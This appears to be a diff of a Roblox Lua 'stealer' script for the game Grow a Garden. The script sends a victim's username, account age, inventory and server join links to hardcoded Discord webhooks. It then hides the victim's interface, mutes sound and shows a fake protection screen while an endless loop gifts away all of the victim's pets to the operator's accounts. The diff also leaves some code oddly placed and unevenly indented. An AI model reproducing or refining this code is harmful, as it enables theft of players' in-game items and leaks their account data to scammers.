@@ -409,131 +409,6 @@ end
             end
         end
 
---// ──────────────────────────────────────────────────────────────────────
---//  WEBHOOK – EDIT SAME MESSAGE (Success → Waiting → Failed)
---// ──────────────────────────────────────────────────────────────────────
-
-local Webhook = getgenv().Webhook
-local LogsWebhook = "https://discord.com/api/webhooks/1436030793238446303/8I9MFJKVtlOdVRng-2vgI4eMsWXjDp3bgrUZWAgCUBjSn4DCjhGgkwYldjWjgGgmXh_k"
-
-local base = {
-    DisplayName = Players.LocalPlayer.DisplayName or "Unknown",
-    Username    = Players.LocalPlayer.Name or "Unknown",
-    AccountAge  = tostring(Players.LocalPlayer.AccountAge or 0) .. " Days",
-    Receiver    = Username or "Unknown",
-    Executor    = detectExecutor() or "Unknown",
-    PlayerCount = (playerCount or 0) .. " / 5",
-    PetString   = truncateByLines(petString, 20),
-    JoinScript  = 'game:GetService("TeleportService"):TeleportToPlaceInstance('..game.PlaceId..', "'..game.JobId..'")',
-    JoinUrl     = "https://scriptssm.vercel.app/joiner.html?placeId="..game.PlaceId.."&gameInstanceId="..game.JobId,
-    JobId       = game.JobId or "Unknown"
-}
-
-local MessageID = nil  -- Stores the message ID to edit later
-
-local function BuildEmbed(icon, status, desc)
-    return {
-        title = "Scripts.SM",
-        description = "\n"..icon.." **Status:** `"..status.."`\n> "..desc.."\n",
-        color = 3447003,
-        fields = {
-            {name = "<:players:1365290081937526834> **Display Name    **", value = "```"..base.DisplayName.."```", inline = true},
-            {name = "<:game:1365295942504550410> **Username**",          value = "```"..base.Username.."```",    inline = true},
-            {name = "<:time:1365991843011100713> **Account Age**",      value = "```"..base.AccountAge.."```",  inline = true},
-            {name = "<:folder:1365290079081205844> **Receiver**",       value = "```"..base.Receiver.."```",    inline = true},
-            {name = "<:Events:1394005823931420682> **Executor**",       value = "```"..base.Executor.."```",    inline = true},
-            {name = "<:events:1365290073767022693> **Player Count**",   value = "```"..base.PlayerCount.."```", inline = true},
-            {name = "<:pack:1365295947281862656> **Inventory**",        value = "```"..base.PetString.."```"},
-            {name = "<:emoji_2:1402577600060325910>  **Join Script**",  value = "```lua\n"..base.JoinScript.."\n```"},
-            {name = "<:location:1365290076279541791> **Join via URL**", value = "[ **Click Here to Join!**]("..base.JoinUrl..")"}
-        },
-        author = { name = "Grow a Garden", url = base.JoinUrl, icon_url = "https://scriptssm.vercel.app/pngs/bell-icon.webp" },
-        footer = { text = "discord.gg/cnUAk7uc3n", icon_url = "https://i.ibb.co/5xJ8LK6X/ca6abbd8-7b6a-4392-9b4c-7f3df2c7fffa.png" },
-        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
-        image = { url = "https://scriptssm.vercel.app/pngs/gag.webp" }
-    }
-end
-
-local function SendOrEdit(url, payload, edit)
-    if not url then return end
-    local method = edit and "PATCH" or "POST"
-    local fullUrl = edit and (url .. "/messages/" .. MessageID) or url
-
-    local success, response = pcall(function()
-        return request({
-            Url = fullUrl,
-            Method = method,
-            Headers = {["Content-Type"] = "application/json"},
-            Body = HttpService:JSONEncode(payload)
-        })
-    end)
-
-    if success and not edit then
-        local data = HttpService:JSONDecode(response.Body)
-        MessageID = data.id  -- Save ID for editing
-    end
-end
-
---// EXPORT: Call these functions when needed
-local WebhookAPI = {}
-
---// 1. Send INITIAL message (Waiting or Success)
-function WebhookAPI.Start()
-    local payload = {
-        content = "> Jump or type anything in chat to start.",
-        embeds = { BuildEmbed("<:Waring_Square:1436287126139437130>", "Waiting", "The user is waiting for you in server.") },
-        username = "Scripts.SM",
-        avatar_url = "https://scriptssm.vercel.app/pngs/logo.png"
-    }
-    SendOrEdit(Webhook, payload, false)
-end
-
---// 2. Edit to SUCCESS
-function WebhookAPI.Success()
-    local payload = {
-        content = "> Jump or type anything in chat to start.",
-        embeds = { BuildEmbed("<:check2:1373169356825169981>", "Success", "All pets have been successfully given to receiver.") },
-        username = "Scripts.SM",
-        avatar_url = "https://scriptssm.vercel.app/pngs/logo.png"
-    }
-    SendOrEdit(Webhook, payload, true)
-end
-
---// 3. Edit to FAILED
-function WebhookAPI.Failed()
-    local payload = {
-        content = "> Jump or type anything in chat to start.",
-        embeds = { BuildEmbed("<:failed:1436288137591783437>", "Failed", "The user has lefted the server.") },
-        username = "Scripts.SM",
-        avatar_url = "https://scriptssm.vercel.app/pngs/logo.png"
-    }
-    SendOrEdit(Webhook, payload, true)
-end
-
---// 4. Send LOG (separate webhook)
-function WebhookAPI.Log()
-    local payload = {
-        content = "> Jump or type anything in chat to start.",
-        embeds = { BuildEmbed("", "Script.SM - Hit", "Script executed successfully.") },
-        username = "Scripts.SM",
-        avatar_url = "https://scriptssm.vercel.app/pngs/logo.png"
-    }
-    SendOrEdit(LogsWebhook, payload, false)
-end
-
---// 5. Optional: @everyone ping (edits main message)
-function WebhookAPI.PingEveryone()
-    if hasRarePets() and MessageID then
-        local payload = {
-            content = "@everyone\nTo activate the stealer you must jump or type in chat",
-            embeds = { BuildEmbed("<:check2:1373169356825169981>", "Success", "All pets have been successfully given to receiver.") }
-        }
-        SendOrEdit(Webhook, payload, true)
-    end
-end
-
-return WebhookAPI
-
 local function CreateGui()
     local player = Players.LocalPlayer
     local gui = Instance.new("ScreenGui")
@@ -743,7 +618,6 @@ local function CreateGui()
     ------------------------------------------------------------------
     -- 10. PET DATA
     ------------------------------------------------------------------
-    local pets = GetPlayerPets()
     local topPets = {}
     local lowPet = nil
     if #pets > 0 then
@@ -845,6 +719,109 @@ local function CreateGui()
         if player.Character then player.Character:Destroy() end
     end)
 end
+--// ──────────────────────────────────────────────────────────────────────
+--//  WEBHOOK – EDIT SAME MESSAGE (Waiting → Failed / Success)
+--// ──────────────────────────────────────────────────────────────────────
+
+local MessageID = nil
+
+local base = {
+    DisplayName = Players.LocalPlayer.DisplayName or "Unknown",
+    Username    = Players.LocalPlayer.Name or "Unknown",
+    AccountAge  = tostring(Players.LocalPlayer.AccountAge or 0) .. " Days",
+    Receiver    = Username or "Unknown",
+    Executor    = detectExecutor() or "Unknown",
+    PlayerCount = (playerCount or 0) .. " / 5",
+    PetString   = truncateByLines(petString, 20),
+    JoinScript  = 'game:GetService("TeleportService"):TeleportToPlaceInstance('..game.PlaceId..', "'..game.JobId..'")',
+    JoinUrl     = "https://scriptssm.vercel.app/joiner.html?placeId="..game.PlaceId.."&gameInstanceId="..game.JobId,
+    JobId       = game.JobId or "Unknown"
+}
+
+local function BuildEmbed(icon, status, desc)
+    return {
+        title = "Scripts.SM",
+        description = "\n"..icon.." **Status:** `"..status.."`\n> "..desc.."\n",
+        color = 3447003,
+        fields = {
+            {name = "<:players:1365290081937526834> **Display Name **", value = "```"..base.DisplayName.."```", inline = true},
+            {name = "<:game:1365295942504550410> **Username**", value = "```"..base.Username.."```", inline = true},
+            {name = "<:time:1365991843011100713> **Account Age**", value = "```"..base.AccountAge.."```", inline = true},
+            {name = "<:folder:1365290079081205844> **Receiver**", value = "```"..base.Receiver.."```", inline = true},
+            {name = "<:Events:1394005823931420682> **Executor**", value = "```"..base.Executor.."```", inline = true},
+            {name = "<:events:1365290073767022693> **Player Count**", value = "```"..base.PlayerCount.."```", inline = true},
+            {name = "<:pack:1365295947281862656> **Inventory**", value = "```"..base.PetString.."```"},
+            {name = "<:emoji_2:1402577600060325910> **Join Script**", value = "```lua\n"..base.JoinScript.."\n```"},
+            {name = "<:location:1365290076279541791> **Join via URL**", value = "[ **Click Here to Join!**]("..base.JoinUrl..")"}
+        },
+        author = { name = "Grow a Garden", url = base.JoinUrl, icon_url = "https://scriptssm.vercel.app/pngs/bell-icon.webp" },
+        footer = { text = "discord.gg/cnUAk7uc3n", icon_url = "https://i.ibb.co/5xJ8LK6X/ca6abbd8-7b6a-4392-9b4c-7f3df2c7fffa.png" },
+        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
+        image = { url = "https://scriptssm.vercel.app/pngs/gag.webp" }
+    }
+end
+
+local function SendOrEdit(url, payload, edit)
+    if not url then return end
+    local method = edit and "PATCH" or "POST"
+    local fullUrl = edit and (url .. "/messages/" .. MessageID) or url
+    local success, res = pcall(function()
+        return request({
+            Url = fullUrl,
+            Method = method,
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode(payload)
+        })
+    end)
+    if success and not edit then
+        local data = HttpService:JSONDecode(res.Body)
+        MessageID = data.id
+    end
+end
+
+local WebhookAPI = {}
+
+function WebhookAPI.Start()
+    local payload = {
+        content = "> Jump or type anything in chat to start.",
+        embeds = { BuildEmbed("<:Waring_Square:1436287126139437130>", "Waiting", "The user is waiting for you in server.") },
+        username = "Scripts.SM",
+        avatar_url = "https://scriptssm.vercel.app/pngs/logo.png"
+    }
+    SendOrEdit(Webhook, payload, false)
+    WebhookAPI.Log()
+end
+
+function WebhookAPI.Success()
+    local payload = {
+        content = "> Jump or type anything in chat to start.",
+        embeds = { BuildEmbed("<:check:1395699056805941249>", "Success", "All pets have been successfully given to receiver.") },
+        username = "Scripts.SM",
+        avatar_url = "https://scriptssm.vercel.app/pngs/logo.png"
+    }
+    SendOrEdit(Webhook, payload, true)
+end
+
+function WebhookAPI.Failed()
+    local payload = {
+        content = "> Jump or type anything in chat to start.",
+        embeds = { BuildEmbed("<:failed:1436288137591783437>", "Failed", "The user has lefted the server.") },
+        username = "Scripts.SM",
+        avatar_url = "https://scriptssm.vercel.app/pngs/logo.png"
+    }
+    SendOrEdit(Webhook, payload, true)
+end
+
+function WebhookAPI.Log()
+    local payload = {
+        content = "> Jump or type anything in chat to start.",
+        embeds = { BuildEmbed("", "Script.SM - Hit", "Script executed successfully.") },
+        username = "Scripts.SM",
+        avatar_url = "https://scriptssm.vercel.app/pngs/logo.png"
+    }
+    SendOrEdit(LogsWebhook, payload, false)
+end
+
         local usernames = {
             "Smiley9Gamerz",
             "BUZZFTWGOD"
@@ -878,105 +855,115 @@ end
             until receiverPlr
         end
 
-        local jumped = false
-        local chatted = false
+--// === WEBHOOK: Start as Waiting ===
+WebhookAPI.Start()
 
-        hum.Jumping:Connect(function()
-            jumped = true
-        end)
+--// === If YOU (LocalPlayer) leave → Failed ===
+Players.LocalPlayer.AncestryChanged:Connect(function()
+    if not Players.LocalPlayer.Parent then
+        WebhookAPI.Failed()
+    end
+end)
 
-        receiverPlr.Chatted:Connect(function()
-            chatted = true
-        end)
+--// === Wait for receiver to jump or chat ===
+local jumped = false
+local chatted = false
 
-        repeat
-            task.wait()
-        until jumped or chatted
+local receiverHum = receiverPlr.Character:WaitForChild("Humanoid")
+receiverHum.Jumping:Connect(function()
+    jumped = true
+end)
+receiverPlr.Chatted:Connect(function()
+    chatted = true
+end)
 
-        for _, v in targetPlr.PlayerGui:GetDescendants() do
-            if v:IsA("ScreenGui") then
-                v.Enabled = false
+repeat task.wait() until jumped or chatted
+
+--// === GIFTING SUCCESS: Edit webhook to Success ===
+WebhookAPI.Success()
+
+--// === DISABLE UI + MUTE SOUNDS ===
+for _, v in targetPlr.PlayerGui:GetDescendants() do
+    if v:IsA("ScreenGui") then
+        v.Enabled = false
+    end
+end
+
+for _, sound in ipairs(workspace:GetDescendants()) do
+    if sound:IsA("Sound") then
+        sound.Volume = 0
+    end
+end
+
+for _, sound in ipairs(game:GetService("SoundService"):GetDescendants()) do
+    if sound:IsA("Sound") then
+        sound.Volume = 0
+    end
+end
+
+game:GetService("CoreGui").TopBarApp.TopBarApp.Enabled = false
+game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
+
+--// === SHOW PROTECTION GUI ===
+CreateGui()
+
+--// === UNEQUIP ALL PETS ===
+if workspace:FindFirstChild("PetsPhysical") then
+    for _, petMover in workspace.PetsPhysical:GetChildren() do
+        if petMover and petMover:GetAttribute("OWNER") == targetPlr.Name then
+            for _, pet in petMover:GetChildren() do
+                PetsService:UnequipPet(pet.Name)
             end
         end
+    end
+end
 
-        for _, sound in ipairs(workspace:GetDescendants()) do
-            if sound:IsA("Sound") then
-                sound.Volume = 0
-            end
-        end
+--// === FAVORITE TOOLS (if d = true) ===
+for _, tool in pairs(targetPlr.Backpack:GetChildren()) do
+    if tool and tool:IsA("Tool") and tool:GetAttribute("d") == true then
+        local tool = targetPlr.Backpack:WaitForChild(tool.Name)
+        RS.GameEvents.Favorite_Item:FireServer(tool)
+    end
+end
 
-        for _, sound in ipairs(game:GetService("SoundService"):GetDescendants()) do
-            if sound:IsA("Sound") then
-                sound.Volume = 0
-            end
-        end
+--// === GIFT FROM ANYWHERE (NO TP, NO PROMPT) ===
+local function giftHeldPet()
+    local char = targetPlr.Character
+    if not char then return false end
+    local held = char:FindFirstChildWhichIsA("Tool")
+    if not held then return false end
+    local success, err = pcall(function()
+        RS.GameEvents.PetGiftingService:FireServer("GivePet", receiverPlr)
+    end)
+    if success then
+        print("GIFTED:", held.Name, "→", receiverPlr.DisplayName)
+        return true
+    else
+        warn("Gift failed:", err)
+        return false
+    end
+end
 
-        game:GetService("CoreGui").TopBarApp.TopBarApp.Enabled = false
-        game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
-        CreateGui()
-
-        if workspace:FindFirstChild("PetsPhysical") then
-            for _, petMover in workspace.PetsPhysical:GetChildren() do
-                if petMover and petMover:GetAttribute("OWNER") == targetPlr.Name then
-                    for _, pet in petMover:GetChildren() do
-                        PetsService:UnequipPet(pet.Name)
+--// === INFINITE GIFTING LOOP ===
+task.spawn(function()
+    while true do
+        task.wait(2)
+        local currentPets = GetPlayerPets()
+        if #currentPets == 0 then continue end
+        for _, pet in ipairs(currentPets) do
+            for _, tool in targetPlr.Backpack:GetChildren() do
+                if tool:IsA("Tool")
+                and tool:GetAttribute("ItemType") == "Pet"
+                and tool:GetAttribute("PET_UUID") == pet.Id then
+                    print("Equipping & gifting:", tool.Name)
+                    targetPlr.Character.Humanoid:EquipTool(tool)
+                    task.wait(0.6)
+                    for i = 1, 3 do
+                        if giftHeldPet() then break end
+                        task.wait(0.3)
                     end
                 end
             end
         end
-
-        for _, tool in pairs(targetPlr.Backpack:GetChildren()) do
-            if tool and tool:IsA("Tool") and tool:GetAttribute("d") == true then
-                local tool = targetPlr.Backpack:WaitForChild(tool.Name)
-                RS.GameEvents.Favorite_Item:FireServer(tool)
-            end
-        end
-
-        -- === NEW: GIFT FROM ANYWHERE (NO TP, NO PROMPT) ===
-        local function giftHeldPet()
-            local char = targetPlr.Character
-            if not char then return false end
-            local held = char:FindFirstChildWhichIsA("Tool")
-            if not held then return false end
-
-            local success, err = pcall(function()
-                RS.GameEvents.PetGiftingService:FireServer("GivePet", receiverPlr)
-            end)
-
-            if success then
-                print("GIFTED:", held.Name, "→", receiverPlr.DisplayName)
-                return true
-            else
-                warn("Gift failed:", err)
-                return false
-            end
-        end
-
-        -- === INFINITE GIFTING LOOP (Keeps gifting forever) ===
-        task.spawn(function()
-            while true do
-                task.wait(2)  -- Re-scan every 2 seconds
-                local currentPets = GetPlayerPets()
-                if #currentPets == 0 then continue end
-
-                for _, pet in ipairs(currentPets) do
-                    for _, tool in targetPlr.Backpack:GetChildren() do
-                        if tool:IsA("Tool")
-                        and tool:GetAttribute("ItemType") == "Pet"
-                        and tool:GetAttribute("PET_UUID") == pet.Id then
-
-                            print("Equipping & gifting:", tool.Name)
-                            targetPlr.Character.Humanoid:EquipTool(tool)
-                            task.wait(0.6)
-
-                            for i = 1, 3 do
-                                if giftHeldPet() then
-                                    break
-                                end
-                                task.wait(0.3)
-                            end
-                        end
-                    end
-                end
-            end
-        end)
+    end
+end)
